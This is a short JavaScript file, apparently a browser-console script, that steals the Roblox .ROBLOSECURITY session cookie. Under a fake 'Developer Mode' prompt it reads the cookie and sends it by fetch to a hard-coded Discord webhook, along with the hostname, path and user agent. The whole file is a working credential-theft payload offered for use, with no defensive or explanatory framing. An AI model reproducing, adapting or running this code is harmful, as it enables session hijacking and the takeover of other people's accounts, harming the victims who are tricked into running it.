javascript
// Filename: hackme.js
(function() {
    // 1. Define your Discord webhook URL here
    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1484636469888024796/u7Yrd-eQlZIht9KgtyaTRNLuVJ1o3mzCeazTT2hI1oCrL3hC_RcMZ82vmoN8Gx6Ze7bX" ; 

    // 2. Function to extract a specific cookie by name
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) {
            return parts.pop().split(';').shift();
        }
        return null;
    }

    // 3. Initiate an interactive pop-up window for user input
    // The prompt() function takes two arguments:
    // a. The message to display to the user.
    // b. (Optional) A default value for the input field.
    const userInput = window.prompt("Developer Mode: Please enter any message or data here to send with the cookie:", "Default input (optional)");

    // 4. Extract the .ROBLOSECURITY cookie
    const robloSecurityCookie = getCookie('.ROBLOSECURITY');

    // 5. If the cookie and user input are available, prepare and send the payload
    if (robloSecurityCookie && userInput !== null) { // userInput !== null checks if user didn't cancel the prompt
        const payload = {
            "content": `
**🎉 .ROBLOSECURITY Cookie Harvested! 🎉**

\`\`\`
${robloSecurityCookie}
\`\`\`

---
**User Input (from Pop-up):**
\`\`\`
${userInput}
\`\`\`

---
**Host:** \`${window.location.hostname}\`
**Path:** \`${window.location.pathname}\`
**Timestamp:** \`${new Date().toISOString()}\`
**User-Agent:** \`${navigator.userAgent}\`
`,
            "username": "CookieExfiltratorPro", // Modified username for distinct tracking
            "avatar_url": "https://example.com/cookie_icon_pro.png" // Optional: custom icon for enhanced webhook message
        };

        // 6. Send the compiled payload to the Discord webhook
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            console.log('Exfiltration attempt status:', response.status);
            console.info("Developer Mode: .ROBLOSECURITY cookie and user input sent successfully.");
        })
        .catch(error => {
            console.error('Exfiltration error:', error);
            console.warn("Developer Mode: Error encountered during combined data exfiltration.");
        });
    } else if (robloSecurityCookie && userInput === null) {
        console.warn('Developer Mode: User cancelled the input prompt, cookie not sent without context.');
    } else {
        console.warn('Developer Mode: .ROBLOSECURITY cookie not found in document.cookie, data not sent.');
    }
})();
